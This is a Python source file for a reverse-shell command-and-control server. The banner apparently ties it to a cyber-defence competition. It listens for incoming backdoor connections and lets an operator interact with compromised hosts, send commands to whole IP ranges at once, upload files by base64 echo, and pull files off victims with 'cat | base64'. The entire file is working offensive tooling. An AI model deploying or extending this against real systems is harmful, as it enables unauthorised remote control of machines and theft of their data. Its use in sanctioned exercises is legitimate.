import argparse
import signal
from termcolor import colored
import asyncio
import os
import subprocess
import aioconsole
import ipaddress
from typing import Optional
import base64  
import sys
sys.path.insert(0, ".")
from ncx_db import ip_range_parser
engine = None
metadata = None
conn = None
SERVER_HOST = "0.0.0.0"
SERVER_PORT= 1984
BUFFER_SIZE = 16384

class ReverseShellManager:
    def __init__(self):
        self.backdoors = {}
    def list_backdoors(self):
        return sorted(self.backdoors.keys())
    def backdoor_index_to_key(self, index):
        return sorted(self.backdoors.keys())[index]
    async def read(self, backdoor)-> Optional[bytes]:
        if backdoor not in self.backdoors:
            return None
        #check if the backdoor is still connected
        if self.backdoors[backdoor][0].at_eof():
            #prune the backdoor
            del self.backdoors[backdoor]
            return None
        #read the data
        return await self.backdoors[backdoor][0].read(BUFFER_SIZE)
    async def upload(self, backdoor, filename, directory="."):
        if backdoor not in self.backdoors:
            return False
        #check if the backdoor is still connected
        if self.backdoors[backdoor][1].is_closing():
            #prune the backdoor
            del self.backdoors[backdoor]
            return False
        #open the file
        try:
            with open(filename, 'rb') as f:
                #read the file
                data = f.read()
                #encode the file to base64
                data = base64.b64encode(data)
                #create the directory if it doesn't exist
                self.backdoors[backdoor][1].write(f"mkdir -p {directory}\n".encode())
                #echo the file to the backdoor with a base64 decode command
                bname = os.path.basename(filename)
                self.backdoors[backdoor][1].write(f"echo {data.decode()} | base64 -d > {directory}/{bname}\n".encode())
                await self.backdoors[backdoor][1].drain()
                return True
        except Exception as e:
            print(f"Error uploading file: {e}")
            return False
    async def download(self, backdoor, filename, directory="."):
        if backdoor not in self.backdoors:
            return False
        #check if the backdoor is still connected
        if self.backdoors[backdoor][1].is_closing():
            #prune the backdoor
            del self.backdoors[backdoor]
            return False
        #echo the file to the backdoor with a base64 decode command
        self.backdoors[backdoor][1].write(f"cat {filename} | base64\n".encode())
        await self.backdoors[backdoor][1].drain()
        #read the data
        data = await self.backdoors[backdoor][0].read(BUFFER_SIZE)
        data = data.decode().strip().replace("\n", "")
        print(data)
        #decode the data
        try:
            data = base64.b64decode(data, validate=True)
        except Exception as e:
            print(f"Error decoding file: {e}")
            return False
        #write the file
        bname = os.path.basename(filename)
        with open(f"{backdoor}_{bname}", 'wb') as f:
            f.write(data)
        return True
        
        
        
    async def write(self, backdoor, data) -> bool:
        if backdoor not in self.backdoors:
            return False
        #check if the backdoor is still connected
        if self.backdoors[backdoor][1].is_closing():
            #prune the backdoor
            del self.backdoors[backdoor]
            return False
        #write the data
        self.backdoors[backdoor][1].write(data)
        await self.backdoors[backdoor][1].drain()
        return True
    async def __handle_backdoor__(self, reader, writer):
        print(colored(f"New backdoor connection from {writer.get_extra_info('peername')[0]}:{writer.get_extra_info('peername')[1]}", 'green'))
        remote = writer.get_extra_info('peername')[0] + ":" + str(writer.get_extra_info('peername')[1])
        self.backdoors[remote] = (reader, writer, { "os" : "unknown", "user" : "unknown" })
        #await it closing
        await self.backdoors[remote][1].wait_closed()

def signal_handler(sig, frame):
    print("\nDisallowed to exit with Ctrl+C, use the exit command\n")
    print(colored("DANGER: IF YOU EXIT THE SERVER, ALL BACKDOORS WILL BE DISCONNECTED", 'red'))
    print("> ", end='')

def list_backdoors(rsm):
    # Get the victims
    backdoors = rsm.list_backdoors()
    # Print the results
    print("Backdoors:")
    print("Index\t\tOrigin:\t\tMetadata:\t")
    print("--------------------------------------------------")
    index = 0
    for backdoor in backdoors:
        #print bullet point
        print(colored("*", 'red'), end='\t')
        print(colored(f"{index}", 'green'), end='\t')
        print(colored(f"{backdoor}", 'green'), end='\t')
        print(colored(f"{rsm.backdoors[backdoor][2]}", 'yellow'), end='\n')
        index += 1
    if len(backdoors) == 0:
        print(colored("*", 'red'), end='\t')
        print(colored("No backdoors connected", 'yellow'))
    print("--------------------------------------------------")

async def main():
    io_lock = asyncio.Lock()
    parser = argparse.ArgumentParser()
    
    #register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    # Print the banner
    colors = ['yellow', 'white', 'grey','black']
    banner = """
    __________                               .___       
\______   \ ___________  _____  __ __  __| _/____   
 |    |  _// __ \_  __ \/     \|  |  \/ __ |\__  \  
 |    |   \  ___/|  | \/  Y Y  \  |  / /_/ | / __ \_
 |______  /\___  >__|  |__|_|  /____/\____ |(____  /
        \/     \/            \/           \/     \/ 
======================================================
Go C3T, Beat Airforce
    """
    for index, c in enumerate(banner):
        print(colored(c, colors[index % len(colors)]), end='')
        
    
    rsm = ReverseShellManager()
    # Create the server
    server = await asyncio.start_server(rsm.__handle_backdoor__, SERVER_HOST, SERVER_PORT)
    await server.start_serving()
    while True:
        # Get the command
        command = ""
        async with io_lock:
            command = await aioconsole.ainput("> ")
        # split the command
        command = command.split()
        if len(command) == 0:
            continue
        elif command[0].startswith("!"):
            #run a shell command
            try:
                output = subprocess.check_output(command[0][1:] + " " + "".join(command[1:]), shell=True)
                print(output.decode())
            except Exception as e:
                print(f"Error running command: {e}")
        elif command[0] == "help":
            print("Available commands: help, exit")
        elif command[0] == "exit":
            break
        elif command[0] == "mass_command":
            if len(command) < 2:
                print("Usage: mass_command (target ip glob range) (command) ...")
                continue
            #parse the ip range
            ips = ip_range_parser(command[1])
            if ips is None:
                print("Invalid IP range")
                continue
            #get all the backdoors that match the ip range
            backdoors = []
            for ip in ips:
                for backdoor in rsm.list_backdoors():
                    if backdoor.startswith(str(ip)):
                        backdoors.append(backdoor)
            if len(backdoors) == 0:
                print("No backdoors match the given IP range")
                continue
            #run the command on all the backdoors
            for backdoor in backdoors:
                print(f"Running command on {backdoor}")
                result = await rsm.write(backdoor, " ".join(command[2:]).encode())
                if not result:
                    print(f"Error running command on {backdoor}")
                else:
                    print(f"Command successfully run on {backdoor}")
        elif command[0] == "shells" or command[0] == "backdoors" or command[0] == "ls":
            list_backdoors(rsm)
        elif command[0] == "interact" or command[0] == "attach" or command[0] == "connect":
            if len(command) < 2:
                print("Usage: interact (shell_ip:shell_port)") 
                continue
            if len(rsm.backdoors) == 0:
                print("No reverse shells connected")
                continue
            if command[1] not in rsm.list_backdoors():
                print("Invalid selection, pick one of the following:")
                list_backdoors(rsm)
                continue
            selection = command[1]
            async def read():
                while True:
                    read_bytes = await rsm.read(selection)
                    if read_bytes is None:
                        break
                    print(read_bytes.decode(), end="")
            async def write():
                while True:
                    input_bytes = ""
                    async with io_lock:
                        input_bytes = await aioconsole.ainput(f"{selection}> ")
                    #add newline
                    input_bytes += "\n"
                    if input_bytes == "":
                        continue
                    elif input_bytes.lower().strip() == "exit":
                        print("Exiting reverse shell")
                        break
                    else:
                        await rsm.write(selection, input_bytes.encode())
            tasks = [asyncio.create_task(read()), asyncio.create_task(write())]
            #wait for first task to finis
            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            #cancel the other task
            for task in pending:
                task.cancel()
        elif command[0] == "upload":
            if len(command) < 3:
                print("Usage: upload (ip glob) (filename)")
                continue
            if len(rsm.backdoors) == 0:
                print("No reverse shells connected")
                continue
            ranges = ip_range_parser(command[1])
            if ranges is None:
                print("Invalid IP range")
                continue
            backdoors = []
            for ip in ranges:
                for backdoor in rsm.list_backdoors():
                    if backdoor.startswith(str(ip)):
                        print(f"Found backdoor {backdoor}")
                        backdoors.append(backdoor)
            if len(backdoors) == 0:
                print("No backdoors match the given IP range")
                continue
            if len(backdoors) > 0:
                for index, backdoor in enumerate(backdoors):
                    print(f"{index}: {backdoor}")
                    if not await rsm.upload(backdoor, command[2]):
                        print("Error uploading file")
                    else:
                        print("File uploaded successfully")
        elif command[0] == "download":
            if len(command) < 3:
                print("Usage: download (shell_ip:shell_port) (filename) [directory]")
                continue
            if len(rsm.backdoors) == 0:
                print("No reverse shells connected")
                continue
            if command[1] not in rsm.list_backdoors():
                print("Invalid selection, pick one of the following:")
                list_backdoors(rsm)
                continue
            selection = command[1]
            directory = "."
            if len(command) > 3:
                directory = command[3]
            if not await rsm.download(selection, command[2], directory):
                print("Error downloading file")
            else:
                print(f"File downloaded successfully to {directory}/{command[2]}")
        else:
            print(f"Unknown command {command[0]}")
    
if __name__ == "__main__":
    asyncio.run(main())